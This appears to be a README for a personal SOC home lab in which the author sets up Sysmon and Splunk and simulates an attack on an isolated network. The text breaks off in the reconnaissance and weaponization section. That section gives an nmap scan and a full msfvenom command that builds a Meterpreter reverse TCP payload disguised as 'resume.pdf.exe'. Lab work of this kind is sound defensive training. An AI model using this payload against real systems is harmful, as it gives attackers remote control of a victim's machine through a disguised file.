# SOC Detection Engineering & SIEM Home Lab (Splunk + Sysmon)

## 📌 Project Overview
In this project, I built a safe, isolated cybersecurity home lab to simulate a real-world malware attack and analyze endpoint telemetry. 

Using **Kali Linux**, I created a custom reverse shell disguised as a PDF file, established a remote connection to a **Windows 10** target machine, and executed discovery commands. On the defensive side, I monitored endpoint activity using **Sysmon** and forwarded the telemetry to **Splunk Enterprise** to trace the parent-child process tree and identify malicious behavior.

---

## 🛠️ Lab Setup & Tools
- **Hypervisor:** Oracle VirtualBox
- **Network Mode:** Isolated Internal Network (Sandboxed with no host or internet exposure)
- **Attacker Machine:** Kali Linux (Static IP: `192.168.100.181`)
- **Target Machine:** Windows 10 Pro (Static IP: `192.168.100.167`)
- **Telemetry & Logging:** Microsoft Sysmon
- **SIEM Platform:** Splunk Enterprise (Splunk Add-on for Sysmon)
- **Attack Tools:** Nmap, MSFvenom, Metasploit Framework (`exploit/multi/handler`)

---

## ⚙️ What I Configured

### 1. Network Sandboxing
- Created an isolated VirtualBox **Internal Network** to ensure malware testing and attack traffic remained completely contained and could not affect the host system or home network.
- Assigned static IP addresses to both VMs and validated internal ICMP routing.

### 2. SIEM & Log Pipeline Setup
- Installed and configured **Microsoft Sysmon** to capture deep endpoint activity.
- Installed **Splunk Enterprise** on Windows and modified `inputs.conf` to automatically ingest Windows Sysmon Operational logs into a dedicated `endpoint` index.
- Installed the **Splunk Add-on for Sysmon** for automated field extraction (Process ID, Parent Image, Process GUID).

---

## 🎯 Threat Simulation & Investigation

### Phase 1: Reconnaissance & Weaponization
- Ran an Nmap scan (`nmap -A -Pn`) from Kali Linux to discover open ports (identified RDP on Port 3389).
- Generated a Meterpreter reverse TCP payload using `msfvenom` disguised with a double file extension:
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.181 LPORT=4444 -f exe -o resume.pdf.exe
